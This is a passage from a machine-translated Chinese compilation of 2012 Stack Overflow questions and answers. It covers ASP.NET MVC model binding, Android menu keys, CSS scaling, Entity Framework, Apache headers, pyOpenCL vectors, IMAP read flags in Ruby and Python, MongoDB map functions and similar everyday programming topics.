                       @Html.HiddenFor(model => @Model[i].ad_media_id)
                       @Html.HiddenFor(model => @Model[i].ad_insert_loc)
                       @Html.HiddenFor(model => @Model[i].ad_priority)
                       @Html.HiddenFor(model => @Model[i].access)
                       @Html.HiddenFor(model => @Model[i].deployment)

                        @for (var j = 0; j < Model[i].lstMatches.Count; j++)
                        {
                            <div id="rule@(Model[i].id)_divRuleGroup_@(Model[i].lstMatches[j].match_group_num)">
                             @Html.HiddenFor(model => Model[i].lstMatches[j].match_rule_id)
                             @Html.HiddenFor(model => Model[i].lstMatches[j].match_id)
                             @Html.HiddenFor(model => Model[i].lstMatches[j].match_group_num)
                             @Html.HiddenFor(model => Model[i].lstMatches[j].match_rule_type)
                             @Html.HiddenFor(model => Model[i].lstMatches[j].created)
                             @Html.HiddenFor(model => Model[i].lstMatches[j].access)
                            <header id="header_rule_Group"><span class="col_a">
                             @if (Model[i].lstMatches[j].Position == "First")
                             {
                                @(Model[i].lstMatches[j].match_group_num) 
                             } </span>
                            <span class="col_b">
                                            @if (Model[i].lstMatches[j].Position == "First")
                                            {
                                            @Html.DropDownListFor(model => Model[i].lstMatches[j].match_group_scope, new SelectList((List<QIOnlineMVC3.Helpers.clsGroupScope>)QIOnlineMVC3.Helpers.General.GetALLGroupScope(), "GroupScope", "GroupScope", Model[i].lstMatches[j].match_group_scope))
                                            }
                                            else
                                            {
                                                @Html.HiddenFor(model => Model[i].lstMatches[j].match_group_scope)
                                            }
                                          </span></header>
                            <div class="match">
                                <span class="col_c">@(Model[i].lstMatches[j].match_group_seq) @Html.HiddenFor(model => Model[i].lstMatches[j].match_group_seq) </span> 
                                <span class="col_d">
                                <a href="@(Url.Action("DeleteMatch", new { id = Model[i].lstMatches[j].match_id }))">
                                    <img alt="Delete" src="../../Content/Images/delete-icon.png" width="17" height="17" border="0" title="delete" /></a> 

                                        </span><span class="col_e">@(Model[i].lstMatches[j].match_id)
                                        </span><span class="col_f">
                                            @Html.DropDownListFor(model => Model[i].lstMatches[j].match_loc, new SelectList((List<QIOnlineMVC3.Helpers.clsMatchLocations>)QIOnlineMVC3.Helpers.General.GetALLMatchLocations(), "MatchLocations", "MatchLocations", Model[i].lstMatches[j].match_loc))
                                        </span><span class="col_g">
                                            @Html.DropDownListFor(model => Model[i].lstMatches[j].match_target_field, new SelectList((List<QIOnlineMVC3.Helpers.clsTargetField>)QIOnlineMVC3.Helpers.General.GetALTargetField(), "TargetField", "TargetField", Model[i].lstMatches[j].match_target_field))
                                        </span><span class="col_h">
                                            @Html.DropDownListFor(model => Model[i].lstMatches[j].match_type, new SelectList((List<QIOnlineMVC3.Helpers.clsMatchType>)QIOnlineMVC3.Helpers.General.GetALLMatchType(), "MatchTypeID", "MatchType", Model[i].lstMatches[j].match_type))
                                        </span><span class="col_i">
                                            @Html.TextBoxFor(model => Model[i].lstMatches[j].match_set_name, new { @value = Model[i].lstMatches[j].match_set_name, @class = "clsauto" })
                                            </span></div>
                            </div>

                                       if (Model[i].lstMatches[j].Last == "Last")
                                       {
                            <div id="Group_rule_@(Model[i].id)_@(Model[i].lstMatches[j].match_group_num)"></div>
                            <!-- end MATCH -->
                            <div class="new">
                                @Ajax.ImageWithTextActionLink("<img src=\"../../Content/Images/new-icon.png\" width=\"17\" height=\"17\" border=\"0\" alt=\"New Match\" />New Match", "NewMatch", new { ruleid = Model[i].id, groupid = Model[i].lstMatches[j].match_group_num }, new AjaxOptions { UpdateTargetId = "Group_rule_" + Model[i].id.ToString() + "_" + Model[i].lstMatches[j].match_group_num, InsertionMode = InsertionMode.InsertBefore, HttpMethod = "Get", LoadingElementId = "msgLoading" })
                            </div>
                                       }

                        }

                    </div>
                    <!-- end MATCH GROUP -->
                    <!-- END Loop of Matches -->
                    <div class="new new_group">
                        @Ajax.ImageWithTextActionLink("<img src=\"../../Content/Images/new-icon.png\" width=\"17\" height=\"17\" border=\"0\" alt=\"New Group\" />New Group</a>", "NewGroup", new { ruleid = Model[i].id }, new AjaxOptions { UpdateTargetId = "Group_rule_" + Model[i].id.ToString(), InsertionMode = InsertionMode.InsertAfter, HttpMethod = "Get", LoadingElementId = "msgLoading" })
                        <div class="delete_group">
                            Delete Group ID:
                            <input type="text" id='txtdeleteGroupNo_@(Model[i].id)' />
                            <input type="submit" id='btnDeleteGroup_@(Model[i].id)' value="Delete Group" class="btn btn_delete" style="float: none;" onclick="return DeleteGroup(this);" />
                        </div>
                    </div>
                    <div id="divNewGroup">
                    </div>
                    <div class="btn_row">
                        <input type="reset" name="reset" class="btn" value="Cancel" onclick='DoExpandCollapsh("trMinimised@( Model[i].id)","main_collapsed@( Model[i].id)","main_expanded@( Model[i].id)")'/>
                        <input type="submit" name="btnSave" class="btn" value="Save" />
                        <a href="@(Url.Action("DeleteTravelAdsRule", new { id = Model[i].id }))" class="btn btn_delete">
                            Delete Rule</a>
                    </div>
                </div>
                }

            </td>
        </tr>

    }
</tbody> 
```

这是我的控制器

```
 [Authorize]
    [AcceptVerbs(HttpVerbs.Post)]
    public ActionResult _SaveGroupMatchs(IList<TravelAdsRulesMatchsGroups> mm)
    {
        try
        {
            if (mm != null & mm.Count > 0)
            {

                foreach (var item in mm)
                {
                    List<MatchModel> LMM = item.lstMatches.ToList();
                    List<MatchModel> LMMUpdate = LMM.Where(t => t.match_id != 0).ToList();
                    //update 
                    foreach (var mmupdate in LMMUpdate)
                    {
                        UpdateMatch(mmupdate);
                    }
                    List<MatchModel> LMMSave = LMM.Where(t => t.match_id == 0).ToList();
                    //save
                    foreach (var itemSave in LMMSave)
                    {
                        itemSave.access = item.access;
                        itemSave.deployment = item.deployment;
                        itemSave.match_deployment = item.deployment;
                        CreateMatch(itemSave);
                    }
                }
            }
        }
        catch { Content("Problem due to Error"); }

        return Content("Record Saved Successfully!");
    } 
```

我没有得到第二个 IList 等行......

我怎样才能得到它，有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T10:06:43.283

嗯，我真的不明白你想做什么。

*   如果您想保存`TravelAdsRulesMatchsGroups`
    仅使用一个调用您的`_SaveGroupMatchs`操作方法 的表单的 wole 列表

*   如果您只想保存一个`TravelAdsRulesMatchsGroups`（每条记录一个提交按钮），
    请继续每行使用一个`form`并将控制器的操作更改为

    ```
    public ActionResult _SaveGroupMatchs(TravelAdsRulesMatchsGroups mm) 
    ```

    然后调整你的动作方法来处理一个实例的记录`TravelAdsRulesMatchsGroups`

    而且，在您的视图中，不要使用

    ```
    @Html.HiddenFor(model => model[i].Id) 
    ```

    如果您使用此语法，则呈现的 Html 将是`<input ... name="[i].Id" />`
    （例如。`<input ... name="[2].Id" />`）

    模型绑定器使用`name`来填充模型的属性

    相反，使用

    ```
    @* for your TravelAdsRulesMatchsGroups properties *@
    @Html.Hidden("id", Model[i].id)
    @* ... and so on ...*@

    @* for the lstMatches property, which is a list of MatchModel *@
    @for (var j = 0; j < Model[i].lstMatches.Count; j++)
    {
        @Html.Hidden("lstMatches[" + j.ToString() + "].match_rule_id", Model[i].lstMatches[j].match_rule_id)
        @* ... and so on ...*@
    } 
    ```

注意：小心，您不能使用嵌套的 Html 表单！

# android - 如何完全禁用android上的菜单按钮？

> ID：11736792
> 
> 赞同：3
> 
> 时间：2012-07-31T09:15:10.983
> 
> 标签：android, android-button, android-menu

出于某种原因，如果我在我的应用程序加载内容时长按我的菜单按钮，它就像我按下返回键一样停止。

我不希望菜单按钮像这样，所以我的问题是：

如何完全禁用菜单按钮？我的应用程序中不需要它，我只想将其关闭。

我试过：

```
@Override
public boolean onKeyDown(int keyCode, KeyEvent event){

     if (keyCode == KeyEvent.KEYCODE_BACK){
        onBackPressed();
     }

    if (keyCode == KeyEvent.KEYCODE_MENU){
        return true;
    } 
    else{
        return super.onKeyDown(keyCode, event); 
    }

} 
```

菜单按钮仍然有效...

任何帮助将不胜感激！谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-31T09:17:13.127

您必须返回 true 才能显示菜单；如果您返回 false 则不会显示。所以我猜这会起作用：

```
@Override
 public boolean onPrepareOptionsMenu (Menu menu) {
     .... .....
     return false;
 } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-05-28T05:58:12.480

您必须返回**false**。

```
@Override
public boolean onMenuOpened(final int featureId, final Menu menu) {
    super.onMenuOpened(featureId, menu);
    return false;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-26T15:20:52.617

我也不得不禁用菜单按钮，我所做的是添加以下行：

```
public boolean dispatchKeyEvent(KeyEvent event) {
   return true;
} 
```

这基本上告诉操作系统所有按下的按钮都已处理，因此无需采取任何措施。在 onCreate 方法之后添加它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-02T07:05:07.600

```
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) 
{
     return (keyCode == KeyEvent.KEYCODE_MENU ? true : super.onKeyDown(keyCode, event));
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-10-02T06:29:21.827

您发布的应该可以使用，
仍然尝试一下，它应该可以使用

```
@Override  
public boolean onKeyDown(int keyCode, KeyEvent event) {  
     final int keyCode = event.getKeyCode();  
     if (keyCode == KeyEvent.KEYCODE_MENU){
         return true;
     } 

     return super.onKeyDown(keyCode, event); 
} 
```

# javascript - MVC3 使用多种形式共享下拉列表或隐藏值

> ID：11736794
> 
> 赞同：1
> 
> 时间：2012-07-31T09:15:19.667
> 
> 标签：javascript, jquery, ajax, asp.net-mvc-3, razor

我有一个包含多个选项卡的 jQuery 对话框，每个选项卡都包含一个表单，并且 jQuery 对话框包含一个 DropDownList ，其中包含一个“全局”值，该值将在所有选项卡/表单之间共享。

关键是“站点”，它可以通过隐藏字段或下拉列表设置，具体取决于控制器的结果。

这可能是一项非常微不足道的任务，但我不知道该怎么做（对于 MVC3、JavaScript 和一般的 Web 编程来说仍然是新手）。我可以通过这样做来获取 JavaScript 中的值，`var value = $('#Site').val();`但我不知道如何将其发送到控制器，因为我无法将 JS 变量保存在 C# 变量中，反之亦然。我使用此命令提交表单：`$('#' + tabid).submit();`

代码：

```
<div id='jquery-dialog' title="Create new">

  @if (ViewBag.SiteList == null)
  {
    @Html.Hidden("Site", Request.Params["ForSite"])
  }
  else
  {
    @Html.DropDownList("Site", (SelectList)ViewBag.SiteList)
  }

  <div id="tabs">
    <ul>
      <li><a href="#tab0">Tab 0</a></li>
      <li><a href="#tab1">Tab 1</a></li>
    </ul>

    @using (Ajax.BeginForm("Create", null, new AjaxOptions() { HttpMethod = "POST" }, new { id = "tab0" }))
    {
      <div id="tab0">
        This is Tab 0
      </div>
    }

    @using (Ajax.BeginForm("Create", null, new AjaxOptions() { HttpMethod = "POST" }, new { id = "tab1" }))
    {
      <div id="tab1">
        This is Tab 1
      </div>
    }
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:56:14.187

你可以用javascript来做到这一点。首先，在表单标签内创建一个隐藏字段：

```
@using (Ajax.BeginForm("Create", null, new AjaxOptions() { HttpMethod = "POST" }, new { id = "tab0" }))
    {
      <div id="tab0">
        <input id="tab0Value" name="tab0Value" type="hidden" value="">
        This is Tab 0
      </div>
    } 
```

然后，当您单击提交按钮时（在发送表单之前）从 dropDownList 中获取值并将其设置为隐藏字段：

```
var value = $('#Site').val();
$("#tab0Value").val(value); 
```

# html - 图像无法在设备上缩放

> ID：11736798
> 
> 赞同：0
> 
> 时间：2012-07-31T09:15:26.767
> 
> 标签：html, css, ipad, scaling, device

我真的在为[我的网站](http://www.laurenwomack.com)主页而苦苦挣扎。

显示动画和交互、网页设计、印刷设计和插图的图像在我的计算机上看起来不错，但是当我在 iPad 上查看我的网站时，它们无法正确缩放。

这是CSS：

```
#content { 
   position: relative;
   color: #333;
   width:100%;
   min-width: 900px;
   border:none;
   background: none;
   overflow:auto;
   padding-right:32px;
   padding-left:32px;
   padding-bottom: 86px;
}
#slideshow {
   position:relative;
   height:462px;
   z-index:-1;
}
#slideshow IMG {
   position:absolute;
   top:0;
   left:0;
   z-index:8;
}
#slideshow IMG.active {
   z-index:10;
}
#slideshow IMG.last-active {
   z-index:9;
}
#rightholder {
   float: right;
   clear: left;
   max-width: 639px;
   width: 60%;
   padding-top: 90px;   
   z-index:11;
}
.right {
   float:right;
   margin-bottom:20px;
   max-width: 50%;
   z-index:13;
}
.left{
   float:left;
   margin-bottom:20px;
   max-width: 50%;
   z-index:12;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T12:30:53.613

我不确定您要实现什么，但我相信您的问题主要来自您的一些`min-width`和`max-width`在调整大小时限制页面的属性。

如果您使用灵活的单位，您应该尝试让布局尽可能流畅。我猜您正在使用这些属性来防止奇怪的行为，因为您应该使用[媒体查询](https://developer.mozilla.org/en/CSS/Media_queries/)来使您的设计适应各种分辨率。

您还应该确保没有为图像设置固定大小（在 CSS 或 HTML 文档中）。相反，使用`img { max-width: 100%; }`.

希望能帮助到你。

# .net - Entity Framework DbContext：每次都配置实体？

> ID：11736803
> 
> 赞同：1
> 
> 时间：2012-07-31T09:15:31.527
> 
> 标签：.net, entity-framework, entity-framework-4, entity-framework-4.1, entity-framework-5

我想知道 Entity Framework 是否`System.Data.Entity.DbContext`在每次实例化时都被配置。

*为什么我会得到这个问题？*

例如，如果您正在执行手动映射覆盖`DbContext.OnModelCreating(...)`方法，似乎每次`DbContext`实例化 a 时都会调用它。

**实体框架是否执行某种配置缓存或其他什么？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:25:59.220

配置的模型被缓存。

> Code First 针对特定上下文类型使用的 EDM 作为 DbCompiledModel 的实例缓存在应用程序域中。

有关详细信息，请参阅[代码优先：内部 DbContext 初始化](http://blog.oneunicorn.com/2011/04/15/code-first-inside-dbcontext-initialization/)

# apache - Apache根据不同的域添加请求头

> ID：11736804
> 
> 赞同：4
> 
> 时间：2012-07-31T09:15:32.663
> 
> 标签：apache, http-headers

有[http://foo.com](http://foo.com)和[https://secur.foo.com](https://secur.foo.com)。

如果来自[https://secur.foo.com](https://secur.foo.com)的请求，我想和一些外部信息来请求标头。

有人可以告诉我如何完成上述要求吗？

* * *

我尝试按照以下步骤将标头添加到请求中，但失败了。1.下载一个新的httpd并安装它。2.取消注释行“LoadModule headers_module modules/mod_headers.so” 3.在“httpd.conf”末尾添加以下代码

```
Header add myheader "myvalue"
RequestHeader set myheader2 "myvalue2"

<ifModule mod_headers.c>
    RequestHeader append myheader3 "myvalue3"
</ifModule> 
```

但我只找到“myheader：myvalue”作为响应，如何在请求中显示“myheader2”？ ![在此处输入图像描述](../Images/92aa429e24e8a866d7eb206a8dd3146f.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:37:04.957

试试这个：

```
<ifModule mod_headers.c>
    RequestHeader append myheader2 "myvalue2"
</ifModule> 
```

# openlayers - OpenLayers 平铺地址

> ID：11736809
> 
> 赞同：0
> 
> 时间：2012-07-31T09:15:56.060
> 
> 标签：openlayers, openstreetmap

> server_url/map_folder//15/000/038/756/000/040/716

任何人都可以解释上述网址如何匹配瓷砖？

15 是 ZOOM 级别，但其余部分很复杂。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-25T07:03:11.340

万一有人遇到这个问题，`OpenStreetMap`可以在[OpenStreetMap Wiki](http://wiki.openstreetmap.org/wiki/Slippy_map_tilenames)上找到地图图块 URL 的完整说明。

# opencl - 如何在pyOpenCL中传递向量数组

> ID：11736811
> 
> 赞同：4
> 
> 时间：2012-07-31T09:16:09.843
> 
> 标签：opencl, pyopencl

我正在将模拟移动到 pyOpenCL 中，但无法让我的数据访问工作。我正在尝试提供一维向量数组（嗯，实际上是几个，但我包含的示例只使用了一个）。

目前，几个向量被复制得很好，但是数据根本不是我提供的。

我想我以前没有在这里发过帖，所以如果格式/演示有任何错误，我们深表歉意。另外，我刚刚删除了所有模拟代码，所以我意识到这段代码目前实际上并没有做任何事情，我只是想让缓冲区正确传递。

提前致谢。

内核（kertest.py）：

```
step1 = """
#pragma OPENCL EXTENSION cl_amd_printf: enable
#define X xdim
#define Y ydim
__kernel void k1(__global float3 *spins,
                 __local float3 *tile)
{        
    ushort lid = 2 * get_local_id(0);
    ushort group = 2 * get_group_id(0);
    ushort num = get_num_groups(0);
    int lim = X*Y*3;

    for (ushort i = 0; i < lim; i++)
        {
            if (lid == 0 && group == 0)
            {
                printf("%f :: %d\\n", spins[i].x, i);
            }
         }
}""" 
```

代码本身（gptest.py）：

```
import kertest as k2D
import numpy as np
import pyopencl as cl

class GPU_MC2DSim():
    def __init__(self, x, y):
        self.x = x
        self.y = y

        if x >= y:
            self.xdim = int(self.x)
            self.ydim = int(self.y)
        else:
            self.xdim = int(self.y)
            self.ydim = int(self.x)

        if self.xdim % 2 != 0: self.xdim += 1

        if self.ydim % 2 != 0: self.ydim += 1

        self.M = np.ones((self.xdim*self.ydim, 3)).astype(np.float32)
        self.M[:, 1] += 1.0
        self.M[:, 2] += 2.0

        print self.M

    def simulate(self):
        ctx = cl.create_some_context()
        q = cl.CommandQueue(ctx)
        mf = cl.mem_flags

        #Pass buffer:
        M_buf = cl.Buffer(ctx, mf.READ_WRITE | mf.COPY_HOST_PTR, hostbuf = self.M)

        #Insert kernel parameters:
        params = {"xdim" : "%d" % (self.xdim),
                  "ydim" : "%d" % (self.ydim),
                  }
        for name in params:
            k2D.step1 = k2D.step1.replace(name, params[name])

        #Compile kernel:
        step1 = cl.Program(ctx, k2D.step1).build()

        locmem = cl.LocalMemory(self.xdim*4*4)

        step1.k1(q, ((self.xdim*self.ydim)/4,), (self.xdim/2,), M_buf, locmem).wait()
        return None

xdim = 4
ydim = 4
sim = GPU_MC2DSim(xdim, ydim)
sim.simulate() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T19:43:55.543

您将数据复制到设备的代码很好。但是，您的内核至少有两个问题：

1.  `float3`根据 OpenCL 1.2 Spec, 6.1.5，值应为 16 字节对齐：

    > 对于 3 分量向量数据类型，数据类型的大小为 4 * `sizeof`（分量）。这意味着 3 分量矢量数据类型将与 4 * `sizeof`（分量）边界对齐。vload3和**vstore3****内置**函数可用于从打包标量数据类型数组中分别读取和写入三分量向量数据类型。

    您上传到设备的值未正确对齐，内核无法`float3`直接读取值。

2.  您的限额计算`int lim = X*Y*3;`略有偏差。您已经在尝试从 的数组中读取`float3`，所以`*3`是多余的。

这两个问题的解决方案很简单：如规范中所述，您应该使用**vload3**从 s 数组中加载`float`：

```
#pragma OPENCL EXTENSION cl_amd_printf: enable
#define X xdim
#define Y ydim
__kernel void k1(__global float *spins,
                 __local float3 *tile)
{
    ushort lid = 2 * get_local_id(0);
    ushort group = 2 * get_group_id(0);
    ushort num = get_num_groups(0);
    int lim = X*Y;

    for (ushort i = 0; i < lim; i++)
        {
            if (lid == 0 && group == 0)
            {
                float3 vec = vload3(i, spins);
                printf("(%f, %f, %f) :: %d\\n", vec.x, vec.y, vec.z, i);
            }
         }
} 
```

# android - Android：如何像 Android Market 一样安装 Apk

> ID：11736817
> 
> 赞同：1
> 
> 时间：2012-07-31T09:16:26.097
> 
> 标签：android, installation, apk, android-install-apk

我是安卓新手。我可以以编程方式安装一个存在于 SD 卡中的 APK。它会提示用户安装 APK。但是我需要在没有提示的情况下安装，就像我们在 Android Market (Google Play) 中所做的那样，我们点击安装并自动安装应用程序而不提示。

注意：* 我在 stackoverflow 上找到了一些链接，但所有这些机制都会提示用户。

这该怎么做？请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:31:55.697

这里有一些信息：

[静默安装应用程序，并授予 INSTALL_PACKAGES 权限](https://stackoverflow.com/questions/5803999/install-apps-silently-with-granted-install-packages-permission)

和这里 ：

[AppBrain 的安装应用程序是如何工作的？](https://stackoverflow.com/questions/3224507/how-does-appbrains-installation-app-work)

我认为在不告诉用户和/或不向他显示您要求的权限的情况下安装某些东西并不是一个好主意。在第二个链接中，CommonsWare 对这个想法给出了非常好的评论。

如果您想在 Play Store 上发布您的应用程序，您可以查看[Android 的开发者分发协议第 4.5 条。](http://www.android.com/us/developer-distribution-agreement.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:20:10.157

我很确定你不能。我想 Play Store 可以访问您无法使用的 API，因为它是使用 Google 密钥签名的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:33:04.697

您的应用需要使用平台签名进行签名才能直接从您的应用安装应用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T10:28:00.400

您能否明确说明“我可以以编程方式安装存在于 SD 卡中的 APK”和“需要在没有提示的情况下安装”的确切含义。

但根据我对您实际意思的猜测，如果您想要安装非市场上的 APK，请在设置的安全选项卡中选中“未知来源”选项。AFAIK 只有这样您才能安装未签名的 APK

# ruby-on-rails - Rails + nginx - 一起工作

> ID：11736825
> 
> 赞同：2
> 
> 时间：2012-07-31T09:16:50.447
> 
> 标签：ruby-on-rails, nginx

我安装了乘客、nginx (1.2.1) 和 Rails 3.2.3。但是我一直使用 WebBrick 作为 Rails 的服务器，因为我不知道如何让它们一起工作。换句话说，如何在 nginx 上运行我正在研究的网站。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:23:08.880

网络上有几种解决方案，包括 nginx 和 Thin，这是一个很好的组合。这是一个对我有用的：

[http://blog.expertura.de/posts/17](http://blog.expertura.de/posts/17)

也是一个非常好的，但在德语（原因代码仍然正确）：

[http://www.netzlogger.de/2010/02/rails-applikationen-mit-nginx-und-thin.html](http://www.netzlogger.de/2010/02/rails-applikationen-mit-nginx-und-thin.html)

# ruby - 邮件宝石：如何将电子邮件设置为“阅读”？

> ID：11736829
> 
> 赞同：3
> 
> 时间：2012-07-31T09:17:11.693
> 
> 标签：ruby, email, gem

我必须用 Ruby 编写一个电子邮件导入器，我偶然发现了 Ruby 1.9 的非常漂亮的 Mail gem。我知道如何遍历未读消息，但我不知道如何将它们标记为已读（文档很详尽，但我真的不知道要注意什么）：

```
Mail.defaults do
  retriever_method :imap,
    address:    email_account.email_server.host,
    port:       email_account.email_server.port,
    user_name:  email_account.address,
    password:   email_account.password,
    enable_ssl: email_account.email_server.ssl
end

emails = Mail.find(
  what: :first,
  count: 3,
  order: :asc
)

emails.each do |email|
  # Do some stuff and then mark as read!
end 
```

非常感谢您为我指明了正确的方向。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-30T17:47:33.580

很容易做的事

```
Mail.defaults do
    retriever_method :imap,
    address:    email_account.email_server.host,
    port:       email_account.email_server.port,
    user_name:  email_account.address,
    password:   email_account.password,
    enable_ssl: email_account.email_server.ssl
end

Mail.find(what: :first, count: 3, order: :asc) do |email, imap, uid|
    # Do some stuff
    # ..
    # mark as read
    imap.uid_store( uid, "+FLAGS", [Net::IMAP::SEEN] )
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:31:22.540

请试试这个..

[将 IMAP 电子邮件标记为已读/未读（已查看/未查看）：](http://www.example-code.com/ruby/imap_markAsRead.asp)

```
require 'chilkat'

imap = Chilkat::CkImap.new()

#  Anything unlocks the component and begins a fully-functional 30-day trial.
success = imap.UnlockComponent("Anything for 30-day trial")
if (success != true)
    print imap.lastErrorText() + "\n";
    exit
end

#  Connect to an IMAP server.
success = imap.Connect("mail.chilkatsoft.com")
if (success != true)
    print imap.lastErrorText() + "\n";
    exit
end

#  Login
success = imap.Login("myLogin","myPassword")
if (success != true)
    print imap.lastErrorText() + "\n";
    exit
end

#  Select an IMAP mailbox
success = imap.SelectMailbox("Inbox")
if (success != true)
    print imap.lastErrorText() + "\n";
    exit
end

#  Set PeekMode so that downloaded messages are not
#  automatically marked as seen.
imap.put_PeekMode(true)

#  The NumMessages property contains the number of messages
#  in the currently selected mailbox.
numMsgs = imap.get_NumMessages()
if (numMsgs == 0)
    exit
end

for i in 1 .. numMsgs
    #  Download each email by sequence number (not UID)

    # email is a CkEmail
    email = imap.FetchSingle(i,false)
    if (email == nil )
        print imap.lastErrorText() + "\n";
        exit
    end

    #  If desired, mark the email as SEEN.  There are two
    #  ways to do it:

    #  1) Set the flag directly by using the sequence number
    #  Indicate that we are passing a sequence number and
    #  not a UID:
    bIsUid = false
    #  Set the SEEN flag = 1 to mark the email as SEEN,
    #  or set it to 0 to mark it as not-seen.
    success = imap.SetFlag(i,bIsUid,"SEEN",1)
    if (success != true)
        print imap.lastErrorText() + "\n";
        exit
    end

    #  2) Alternatively, we can use the email object.
    #  When an email is downloaded from the IMAP server
    #  Chilkat will add a "ckx-imap-uid" header to the email.
    #  This makes it possible to know the UID associated with
    #  the email.  (This is not the sequence number, which may change
    #  from session to session, but the UID which does not change.
    #  The SetMailFlag method is identical to SetFlag, except
    #  it gets the UID from the ckx-imap-uid header.
    #  For example:
    success = imap.SetMailFlag(email,"SEEN",1)
    if (success != true)
        print imap.lastErrorText() + "\n";
        exit
    end

end

#  Disconnect from the IMAP server.
imap.Disconnect() 
```

或试试这个..

[在 Ruby 中将所有未读邮件标记为已读](http://www.dzone.com/snippets/mark-all-unread-mail-read-ruby)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-13T01:51:15.693

尝试这个：

```
Mail.find(keys: ['NOT','SEEN']) do |email, imap, uid|
  imap.uid_store(uid, "+FLAGS", [:Seen])
end 
```

# javascript - 'recursive toObject' 13076 断言在 MongoDB 中失败

> ID：11736831
> 
> 赞同：0
> 
> 时间：2012-07-31T09:17:14.253
> 
> 标签：javascript, mongodb, mapreduce, assertion

今天我的地图函数开始报告断言失败 13076 'recursive toObject' 代码。它昨天工作得很好。

这是我的地图功能：

```
function () {
    for(i=0; i<this.values.length; i++) {
        emit(this.values[i].id, {
            'id': this.values[i].id,
            'start_date': this.values[i].start_date,
            'end_date': this.values[i].end_date,
            'hash': this.values[i].hash,
            'url': this.values[i].url});
    }  
} 
```

我尝试用 forEach 函数替换 for 循环，但结果是一样的。

具有范围变量限制映射函数到单个发射的有趣函数工作得很好：

```
function () {
    for(i=0; i<this.values.length; i++) {
        if(this.values[i].id == myId) {
            emit(this.values[i].id, {
                'id': this.values[i].id,
                'start_date': this.values[i].start_date,
                'end_date': this.values[i].end_date,
                'hash': this.values[i].hash,
                'url': this.values[i].url});
        }
    }
} 
```

当然，我可以直接在代码中执行这个映射，但是当我真的需要使用 MapReduce 时，我不想再遇到这个错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T09:12:02.247

好的，所以错误消息真的很模糊，但问题似乎是由 'values' 数组中的 'id' 字段的重复值引起的。当我更改其中一个数组元素中的 id 时，该函数再次开始工作。

# ios - Facebook iOS SDK 3.0 贴在墙上

> ID：11736833
> 
> 赞同：5
> 
> 时间：2012-07-31T09:17:22.283
> 
> 标签：ios, facebook, facebook-ios-sdk

有没有办法通过提要对话框使用新的 Facebook iOS SDK 发布到用户的墙上（就像以前在旧的 FBconnect 中一样）？

`requestForPostStatusUpdate:`需要发布权限才能流式传输，我不想向用户询问。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-29T03:13:10.760

对 FacebookSDK/FacebookSDK.h 进行全球搜索，确保您没有将其导入任何地方。把我绊倒了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T22:35:59.230

Facebook 建议使用较旧的头文件发布更新。从 facebook“要调用 Facebook 对话框，请参考 Facebook 已弃用的标头。标头可在此处找到 ~Documents/FacebookSDK/FacebookSDK.framework/Versions/A/DeprecatedHeaders。拖动整个 DeprecatedHeaders 文件夹并取消选择“将项目复制到目标组”文件夹（如果需要）'' 选项以添加标题作为参考。”

# python - 大收件箱上的 imaplib.select：命令参数太多

> ID：11736842
> 
> 赞同：3
> 
> 时间：2012-07-31T09:17:59.690
> 
> 标签：python, python-3.x, imap, gmail-imap

我正在尝试从 python 脚本访问我在 Gmail 中的电子邮件。我使用的代码如下：

```
import imaplib
m = imaplib.IMAP4_SSL("imap.gmail.com")
m.login("username","password")
m.select("[Gmail]/All Mail") 
```

在 python 2 中运行此代码时，它运行良好，我得到了我所有电子邮件的列表。在 python 3 hoverer 中失败并出现错误

```
>>> m.select("[Gmail]/All Mail")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.2/imaplib.py", line 674, in select
    typ, dat = self._simple_command(name, mailbox)
  File "/usr/lib/python3.2/imaplib.py", line 1121, in _simple_command
    return self._command_complete(name, self._command(name, *args))
  File "/usr/lib/python3.2/imaplib.py", line 957, in _command_complete
    raise self.error('%s command error: %s %s' % (name, typ, data))
imaplib.error: SELECT command error: BAD [b'[CLIENTBUG] Too many arguments for command'] 
```

我做了一些测试。它适用于其他文件夹，例如“收件箱”，我只收到 400 封电子邮件（与“所有邮件”中的 6000 封相比）。

这是与列表大小有关的问题吗？为什么它在 python 2 和 3 中有所不同？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T13:39:44.460

尝试使用`m.select('"[Gmail]/All Mail"')`, 以便传输双引号。

我怀疑 imaplib 没有正确引用字符串，所以服务器得到看起来像两个参数的东西：`[Gmail]/All`和`Mail`.

# string - 在元胞数组中查找字符串

> ID：11736845
> 
> 赞同：0
> 
> 时间：2012-07-31T09:18:20.110
> 
> 标签：string, cells

我想测试文件名的扩展名是否在扩展名列表中。

我在单元格数组上使用 strfind 进行了尝试，但没有看到如何从结果矩阵中获取布尔值。

```
strfind({'tif'; 'jpg'},'jpg') % should give true
strfind({'tif'; 'jpg'},'bmp') % should give false 
```

第一个结果是

```
[]
[1] 
```

第二个在

```
[]
[] 
```

* * *

## 回答 #1

> 赞同：1
> 
